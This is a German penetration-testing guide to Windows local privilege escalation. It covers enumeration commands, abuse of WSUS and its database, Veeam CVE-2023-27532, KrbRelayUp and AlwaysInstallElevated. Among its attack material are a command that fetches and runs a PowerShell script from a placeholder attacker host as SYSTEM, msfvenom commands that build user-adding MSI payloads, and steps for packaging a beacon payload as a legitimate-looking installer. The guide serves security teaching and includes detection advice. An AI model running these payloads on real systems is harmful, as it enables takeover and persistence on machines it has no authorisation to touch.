# Lokale Rechteausweitung unter Windows

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool zum Auffinden von Vektoren zur lokalen Rechteausweitung unter Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Diese Seite fasst die allgemeine Methodik zur Rechteausweitung unter Windows aus mehreren grundlegenden Anleitungen zusammen.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Der praktische Ablauf der Enumeration stützt sich außerdem auf Community-Workshops und Checklisten.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Das historische Angriffsmaterial umfasst die DerbyCon-Präsentation zur Rechteausweitung unter Windows.<sup>[[5]](#references)</sup>

## Grundlagen zu Windows

### Access Tokens

**Wenn du nicht weißt, was Windows-Access-Tokens sind, lies die folgende Seite, bevor du fortfährst:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs - DACLs/SACLs/ACEs findest du auf der folgenden Seite:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Wenn du nicht weißt, was Integrity Levels unter Windows sind, lies die folgende Seite, bevor du fortfährst:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Es gibt verschiedene Dinge unter Windows, die **dich daran hindern können, das System zu enumerieren**, ausführbare Dateien auszuführen oder sogar **deine Aktivitäten zu erkennen**. Du solltest die folgende **Seite lesen** und alle diese **Abwehrmechanismen** **enumerieren**, bevor du mit der Enumeration zur Rechteausweitung beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physischer Zugriff kann außerdem dazu führen, dass eine Offline-Änderung des UEFI-NVRAM in eine Pre-Boot-DMA- und Windows-`SYSTEM`-Speicher-Patching-Kette mündet:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / stille UIAccess-Erhöhung

Über `RAiLaunchAdminProcess` gestartete UIAccess-Prozesse können missbraucht werden, um ohne Nachfrage High IL zu erreichen, wenn die sicheren Pfadprüfungen von AppInfo umgangen werden. Den speziellen Ablauf zum Umgehen von UIAccess/Admin Protection findest du hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Registry-Propagation für Barrierefreiheit auf dem Secure Desktop kann für beliebige SYSTEM-Registry-Schreibzugriffe (RegPwn) missbraucht werden:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Neuere Windows-Builds bieten außerdem einen LPE-Pfad über **SMB auf beliebigen Ports**, bei dem eine privilegierte lokale NTLM-Authentifizierung über eine wiederverwendete SMB-TCP-Verbindung reflektiert wird:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Systeminformationen

### Enumeration der Versionsinformationen

Prüfe, ob für die Windows-Version bekannte Schwachstellen vorliegen (prüfe auch die installierten Patches).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Versions-Exploits

Diese [Website](https://msrc.microsoft.com/update-guide/vulnerability) ist hilfreich, um detaillierte Informationen zu Sicherheitslücken in Microsoft-Produkten zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **riesige Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — erfasst den OS-Build, installierte Updates und ausgewählte potenzielle Advisories; überprüfe das genaue Produkt und nachfolgende Updates, bevor du ein Ergebnis als zutreffend einstufst.

Prüfe bei einem versionsspezifischen lokalen Exploit sowohl die **Architektur des laufenden Prozesses** als auch die OS-Architektur. Unter 64-Bit-Windows unterliegt ein 32-Bit-Prozess der [WOW64-Dateisystemumleitung](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` verweist normalerweise auf das 32-Bit-Systemverzeichnis, während `%windir%\Sysnative` dem Prozess Zugriff auf das native Systemverzeichnis ermöglicht. Für einen 64-Bit-Prozess ist dieser Alias nicht verfügbar. Ein OS-Build oder ein fehlendes KB-Update beweist nicht, dass ein Exploit ausnutzbar ist. Vergleiche den laufenden Build, installierte oder nachfolgende Updates, die Prozessarchitektur und die Exploit-Voraussetzungen mit dem [Microsoft-Sicherheitsbulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) für das konkrete Problem.

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub-Repositories mit Exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind Zugangsdaten/Juicy-Informationen in den Umgebungsvariablen gespeichert?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell-Verlauf

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell-Transkriptdateien

Wie du dies aktivierst, erfährst du unter [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ist nur ein Beispiel. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) schreibt normalerweise in den Ordner „Dokumente“ jedes Benutzers. Eine `OutputDirectory`-Einstellung oder `Start-Transcript -OutputDirectory` kann Dateien jedoch in einen gemeinsamen oder versteckten Ordner umleiten. Prüfen Sie den effektiven Ausgabepfad und die Datei-ACL, bevor Sie ein Transkript überprüfen: Es kann Befehlsargumente und Ausgaben enthalten, darunter Zugangsdaten. Ein lesbares Transkript ist nur dann ein Hinweis, wenn sein Inhalt eine verwendbare Identität mit höheren Berechtigungen offenlegt und sich diese Identität im relevanten Kontext anmelden kann.

### PowerShell Module Logging

Details zu PowerShell-Pipelineausführungen werden protokolliert, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teilen von Skripten. Es werden jedoch möglicherweise nicht alle Ausführungsdetails und Ausgabeergebnisse erfasst.

Folgen Sie zum Aktivieren den Anweisungen im Dokumentationsabschnitt „Transcript files“ und wählen Sie **„Module Logging“** statt **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Um die letzten 15 Ereignisse aus den PowersShell-Logs anzuzeigen, kannst du Folgendes ausführen:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Ein vollständiger Aktivitäts- und Inhaltsnachweis der Skriptausführung wird erfasst. Dadurch wird jeder Codeblock während seiner Ausführung dokumentiert. Dieser Prozess bewahrt einen umfassenden Prüfpfad aller Aktivitäten, der für forensische Untersuchungen und die Analyse schädlichen Verhaltens wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt ihrer Ausführung werden detaillierte Einblicke in den Prozess ermöglicht.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Logging-Ereignisse für den Script Block finden Sie in der Windows-Ereignisanzeige unter **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Interneteinstellungen

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Laufwerke

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Ein HTTP-WSUS-Endpunkt ist ein Ansatzpunkt für die Untersuchung einer möglichen Abfangung von Update-Metadaten. Eine Ausnutzung hängt außerdem davon ab, ob der Client diesen WSUS-Server verwendet, ob ein Angreifer dessen Datenverkehr abfangen oder kontrollieren kann und welche Update-Vertrauens- und Installationsrichtlinien auf dem Client gelten. Die URL allein ermöglicht keine Codeausführung. [Microsoft empfiehlt TLS für WSUS-Metadaten](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Prüfe zunächst, ob das Netzwerk Updates über einen WSUS-Server ohne SSL bezieht, indem du Folgendes in cmd ausführst:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Oder das Folgende in PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Wenn du eine Antwort wie eine der folgenden erhältst:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Wenn `UseWUServer` den Wert `1` hat, verwendet Windows Update den konfigurierten Intranetdienst. Das bestätigt eine Voraussetzung für den HTTP-Interception-Pfad, beweist jedoch nicht, dass eine Interception, die Annahme eines bösartigen Updates oder eine Installation mit erhöhten Rechten möglich ist. Bei einem Wert von `0` wird dieser bestimmte konfigurierte WSUS-Endpunkt von dieser Richtlinie nicht ausgewählt.

Um diese Schwachstellen auszunutzen, können Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit) und [pyWSUS ](https://github.com/GoSecure/pywsus) verwendet werden. Dabei handelt es sich um weaponized MiTM-Exploit-Skripte, mit denen sich „gefälschte“ Updates in nicht per SSL geschützten WSUS-Datenverkehr einschleusen lassen.

Die Forschung dazu finden Sie hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Den vollständigen Bericht hier lesen**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Im Wesentlichen nutzt dieser Bug folgende Schwachstelle aus:

> Wenn wir unseren lokalen Benutzerproxy ändern können und Windows Updates den in den Internet-Explorer-Einstellungen konfigurierten Proxy verwenden, können wir [PyWSUS](https://github.com/GoSecure/pywsus) lokal ausführen, unseren eigenen Datenverkehr abfangen und auf unserem System Code als Benutzer mit erhöhten Rechten ausführen.
>
> Da der WSUS-Dienst außerdem die Einstellungen des aktuellen Benutzers verwendet, greift er auch auf dessen Zertifikatspeicher zu. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostname erstellen und dieses Zertifikat zum Zertifikatspeicher des aktuellen Benutzers hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Datenverkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Trust-on-first-use-Validierung des Zertifikats umzusetzen. Wenn das präsentierte Zertifikat vom Benutzer als vertrauenswürdig eingestuft wird und den korrekten Hostnamen hat, wird es vom Dienst akzeptiert.

Diese Schwachstelle lässt sich mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es veröffentlicht ist).

### Von WSUS-Administratoren kontrollierte Updates

Ein separater Pfad besteht, wenn die aktuelle Identität Updates auf einem WSUS-Server **veröffentlichen und genehmigen** kann. Prüfen Sie die effektive Mitgliedschaft in der Gruppe `WSUS Administrators` des Servers sowie alle delegierten WSUS-Berechtigungen. Ermitteln Sie anschließend die Clientcomputergruppe, für die ein genehmigtes Update bestimmt wäre. [Microsoft verlangt WSUS-Administratorrechte zum Genehmigen von Updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) und [dokumentiert die Vertrauensstellung für die Veröffentlichung](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): Clients müssen dem Signaturzertifikat vertrauen, das für lokal veröffentlichte Inhalte verwendet wird. Stellen Sie sicher, dass das infrage kommende Update signiert und akzeptiert wird, für das Ziel anwendbar ist und in einem Kontext mit höheren Rechten installiert wird, bevor Sie dies als Privilegieneskalationspfad einstufen. Ein HTTP-`WUServer`-Wert oder ein Gruppenname allein belegt diese Voraussetzungen nicht.

### Missbrauch benutzerdefinierter SUSDB-Updates: unsignierte Payloads über `.txt`/`.esd`

Dies ist ein anderer Fehler an der Vertrauensgrenze als das Abfangen einer HTTP-WSUS-Verbindung: Voraussetzung ist ausreichender Zugriff auf die **gespeicherten Prozeduren der WSUS-Datenbank (`SUSDB`)**, um ein benutzerdefiniertes Update zu veröffentlichen und zu genehmigen. Ein möglicher Einstieg ist, ein WSUS-Computerkonto eines Upstream-Servers an einen separaten MSSQL-Server weiterzuleiten, auf dem `SUSDB` gehostet wird. Die genauen Voraussetzungen hängen von der Bereitstellung ab. Ermitteln Sie daher zunächst die `EXECUTE`-Berechtigungen, statt SQL-Administratorrechte vorauszusetzen.<sup>[[38]](#references)[[39]](#references)</sup>

Informationen zum separaten Angriffspfad, bei dem die WSUS-Clientauthentifizierung von HTTP/8530 an LDAP, SMB oder AD CS weitergeleitet wird, finden Sie unter [Missbrauch von WSUS HTTP für NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Update erstellen, Ziel festlegen und genehmigen

Der Workflow für benutzerdefinierte Updates verwendet legitime WSUS-Prozeduren als eingeschränkte Veröffentlichungs-API. Die wichtigen Zustandsübergänge sind:<sup>[[38]](#references)</sup>

| Phase | Relevante gespeicherte Prozeduren |
| --- | --- |
| Update-Metadaten importieren | `spImportUpdate` |
| Voraussetzung sowie lokalisierte und erweiterte XML-Fragmente speichern | `spSaveXMLFragment` |
| Den Inhaltsdigest der vom Angreifer kontrollierten URL zuordnen | `spSetBatchURL` |
| Eine Computergruppe auflisten/erstellen und den Client hinzufügen | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Die Installation für diese Gruppe genehmigen | `spDeployUpdate` mit `@actionID = 0` und `@isAssigned = 1` |

Dateiname, Digests, Größe und `CommandLineInstallation`-Handler müssen in den importierten Metadaten und Fragmenten übereinstimmen. Nachdem die Inhalts-URL und die Zielgruppe festgelegt wurden, sieht die abschließende Genehmigung etwa so aus. Verwenden Sie neue Update-, Gruppen- und Bereitstellungskennungen, statt Beispiel-GUIDs wiederzuverwenden.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Erweiterungsbasierter Signatur-Bypass

WSUS weist normalerweise beliebige, nicht signierte ausführbare Inhalte zurück. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` setzt der .NET-Pfad `VerifyFile` das Flag für die Zertifikatsprüfung jedoch auf „false“, wenn der angegebene Dateiname mit `.txt` oder `.esd` endet. Dadurch wird `CheckCertificateSignature` übersprungen, ohne zuvor nachzuweisen, dass es sich bei den Bytes um Text oder ein legitimes ESD-Image handelt. Daher kann eine unveränderte PE-Datei, die beispielsweise `payload.exe.txt` heißt, die Inhaltsprüfung bestehen und später vom Befehlszeilen-Installationshandler des Updates gestartet werden. Dies ist ein Policy-/Typverwechslungsfehler, keine Signaturfälschung.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatible Bereitstellung und Automatisierung

Ein Aufruf von `spDeployUpdate` veranlasst WSUS, den registrierten Inhalt abzurufen. Der Ursprungsserver muss die HTTP-Anforderungen von BITS erfüllen: Eine erreichbare URL allein reicht nicht aus, da die Übertragung eine anfängliche `HEAD`-/`GET`-Abfolge und Byte-Range-Anfragen verwendet. Ein Server ohne Range-Unterstützung erzeugt das WSUS-Synchronisierungsereignis `EventId=364` mit dem Hinweis, dass BITS den Range-Protokollheader benötigt.<sup>[[39]](#references)</sup>

Der Research-PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiert das für die Import-/Fragment-/URL-/Gruppen-/Deployment-Kette erforderliche SQL, enthält einen modifizierten MSSQL-Client zur Ausführung und liefert `BitsWebServer.py` für die Bereitstellung von Inhalten mit. Ein minimaler Aufruf in einem autorisierten Labor lautet:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Unbeaufsichtigte Ausführung und Persistenz durch Wiederholungsversuche

Die clientseitige Interaktion hängt von der Richtlinie ab. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, Option `4 - Auto download and schedule install`, sorgt dafür, dass ein genehmigtes Update heruntergeladen und nach dem konfigurierten Zeitplan installiert wird, ohne dass der Benutzer es manuell auswählen muss. Bei Tests wurde ein Payload, dessen Update weiterhin fehlgeschlagen/unvollständig war, sofort erneut angeboten, nachdem der Callback-Prozess beendet wurde. Das Verhalten bei Wiederholungsversuchen kann daher zu wiederkehrender Persistenz durch Ausführung führen; dies ist auffällig, da der Client einen fehlgeschlagenen Update-Status anzeigt.<sup>[[39]](#references)</sup>

#### Ansätze zur Erkennung und Härtung

Nützliche server- und clientseitige Ansätze aus dieser Angriffskette sind:<sup>[[39]](#references)</sup>

- Die Ausführung von `spCreateTargetGroup`, `spSetBatchURL` und `spDeployUpdate` in `SUSDB` überwachen; neue Targeting-Gruppen, externe Content-Ursprünge, Update-Payloads mit den Endungen `.txt`/`.esd` sowie Deployments durch unerwartete Principals untersuchen (insbesondere durch Nicht-Computerkonten).
- `C:\Program Files\Update Services\LogFiles` auf `ContentSyncAgent`, `FileVerified`, den falsch geschriebenen Eintrag `FileVerficationFailed` und `EventId=364` prüfen; die Verifizierung anhand der Payload-Endung und des Content-Magic korrelieren, statt der Dateiendung zu vertrauen.
- Wiederholt fehlschlagende/wiederholte Windows-Update-Installationen sowie PE-Ausführung oder unerwartete Aktivitäten von Prozessen/Netzwerkverbindungen bei Content mit `.txt`- oder `.esd`-Namen aufspüren.
- Für den Datenbankdienst Extended Protection for Authentication verlangen, sofern unterstützt, und den Netzwerkzugriff auf die Datenbank auf den WSUS-Server und autorisierte Administrationssysteme beschränken. `EXECUTE`-Rechte auf den Verfahren für benutzerdefinierte Updates minimieren und überwachen.

## Auto-Updater von Drittanbietern und Agent-IPC (lokale privesc)

Viele Enterprise-Agenten stellen eine localhost-IPC-Schnittstelle und einen privilegierten Update-Kanal bereit. Wenn sich die Registrierung auf einen Angreifer-Server umleiten lässt und der Updater einer nicht vertrauenswürdigen Root-CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler Benutzer ein bösartiges MSI bereitstellen, das der SYSTEM-Dienst installiert. Eine verallgemeinerte Technik (basierend auf der Netskope-stAgentSvc-Angriffskette – CVE-2025-0309) finden Sie hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM über TCP 9401)

Veeam Backup & Replication und Cloud Connect verwenden standardmäßig einen zentralen Backup-Dienst auf **TCP/9401**. [Veeams Hinweis](https://www.veeam.com/kb4424) beschreibt die nicht authentifizierte Offenlegung verschlüsselter Zugangsdaten der Konfigurationsdatenbank innerhalb des Backup-Netzwerkperimeters; ein separates öffentliches PoC demonstriert einen Pfad zur Befehlsausführung als **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Der Dienst kann über localhost hinaus gebunden sein. Prüfen Sie daher die tatsächliche Adresse und PID.

- **Recon**: Bestätigen, dass TCP/9401 zu `Veeam.Backup.Service.exe` gehört, und anschließend das installierte Produkt sowie die Patch-Metadaten prüfen. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` sind Anhaltspunkte, aber keine vollständige Patch-Prüfung.
- **Korrigierte Mindestversionen**: Veeam nennt **11a build 11.0.1.1261 P20230227** und **12 build 12.0.0.1420 P20230223** als erste korrigierte Releases; frühere Releases sind betroffen. Eine vierteilige Dateiversion allein kann einen ungepatchten Basis-Build nicht von einem späteren Patch mit denselben Build-Nummern unterscheiden. Prüfen Sie die Patch-Kennung anhand der [Build-Historie des Anbieters](https://www.veeam.com/kb2680), bevor Sie einen Grenz-Build als korrigiert einstufen.
- **Exploit**: Eine PoC-Datei wie `VeeamHax.exe` zusammen mit den benötigten Veeam-DLLs im selben Verzeichnis ablegen und dann einen SYSTEM-Payload über den lokalen Socket auslösen:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Der zitierte PoC demonstriert die Ausführung von Befehlen als SYSTEM, sofern die zusätzlichen Voraussetzungen erfüllt sind; der Sicherheitshinweis des Anbieters beschreibt das Problem der Offenlegung von Anmeldedaten.
## KrbRelayUp

Ein lokaler Kerberos-Relay kann von einer Anmeldung mit geringeren Berechtigungen zu einem privilegierten Schreibzugriff auf ein Verzeichnis führen, wenn sich ein geeigneter COM-Server authentifiziert und der weitergeleitete Prinzipal Berechtigungen für das Zielobjekt hat. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) sowohl RBCD- als auch `msDS-KeyCredentialLink`-LDAP-Schreibzugriffe (shadow-credential); KrbRelayUp automatisiert einige dieser Pfade. Eine RBCD-Kette erfordert geeignete Delegierung und Berechtigungen für das Zielobjekt, während eine shadow-credential-Kette Schreibberechtigungen für Schlüsselanmeldedaten und einen KDC voraussetzt, der den Zertifikatsauthentifizierungspfad unterstützt. Keiner der beiden Pfade ergibt sich allein aus der Mitgliedschaft in der Domäne.

Prüfe die Richtlinien des tatsächlichen DC für [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) und [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), die Objekt-ACL der weitergeleiteten Identität sowie die Authentifizierungs- und Identitätswechselebenen der ausgewählten COM-Klasse. Anmeldetyp und Anmeldeinformationskontext des Aufrufers sind relevant: Eine WinRM-Sitzung kann sich anders verhalten als eine interaktive Anmeldung oder eine Anmeldung mit neuen Anmeldedaten. Auch Firewall-/OXID-Routing und installierte Updates können das Ergebnis beeinflussen. Betrachte eine freizügige Richtlinie oder eine passende ACL als Prüfungsansatz; passive Enumeration sollte keine COM-Coercion, Relay-Authentifizierung oder Verzeichnisschreibzugriffe auslösen. Ein shadow credential für ein Computerkonto kann zu einem Computerticket führen und nur dann, wenn dieses Konto über die erforderlichen Verzeichnisreplikationsrechte verfügt, zu einem separaten DCSync-Pfad.

Finde den **Exploit unter** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Weitere Informationen zum Ablauf des Angriffs findest du unter [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungsschlüssel **aktiviert** sind (Wert **0x1**), können Benutzer mit beliebigen Berechtigungen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Wenn du über eine Meterpreter-Sitzung verfügst, kannst du diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwende den Befehl `Write-UserAddMSI` von power-up, um im aktuellen Verzeichnis eine Windows-MSI-Binärdatei zur Rechteausweitung zu erstellen. Dieses Skript schreibt ein vorkompiliertes MSI-Installationsprogramm, das zum Hinzufügen eines Benutzers/einer Gruppe auffordert (du benötigst also GUI-Zugriff):

```
Write-UserAddMSI
```

Führe einfach die erstellte Binärdatei aus, um deine Berechtigungen zu erweitern.

### MSI Wrapper

Lies dieses Tutorial, um zu erfahren, wie du mit diesem Tool einen MSI Wrapper erstellst. Beachte, dass du eine „**.bat**“-Datei verpacken kannst, wenn du **nur** **Befehlszeilen ausführen** möchtest.


{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- Erstelle mit Cobalt Strike oder Metasploit einen **neuen Windows-EXE-TCP-Payload** unter `C:\privesc\beacon.exe`.
- Öffne **Visual Studio**, wähle **Create a new project** und gib „installer“ in das Suchfeld ein. Wähle das Projekt **Setup Wizard** aus und klicke auf **Next**.
- Gib dem Projekt einen Namen, zum Beispiel **AlwaysPrivesc**, verwende **`C:\privesc`** als Speicherort, wähle **place solution and project in the same directory** aus und klicke auf **Create**.
- Klicke so lange auf **Next**, bis du Schritt 3 von 4 erreichst (Dateien zum Einschließen auswählen). Klicke auf **Add** und wähle den soeben erstellten Beacon-Payload aus. Klicke anschließend auf **Finish**.
- Markiere das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändere in den **Properties** den Wert von **TargetPlatform** von **x86** zu **x64**.
  - Es gibt weitere Eigenschaften, die du ändern kannst, etwa **Author** und **Manufacturer**. Dadurch kann die installierte Anwendung legitimer wirken.
- Klicke mit der rechten Maustaste auf das Projekt und wähle **View > Custom Actions** aus.
- Klicke mit der rechten Maustaste auf **Install** und wähle **Add Custom Action** aus.
- Doppelklicke auf **Application Folder**, wähle die Datei **beacon.exe** aus und klicke auf **OK**. Dadurch wird sichergestellt, dass der Beacon-Payload direkt beim Ausführen des Installationsprogramms gestartet wird.
- Ändere unter **Custom Action Properties** den Wert von **Run64Bit** zu **True**.
- Zum Schluss **baue das Projekt**.
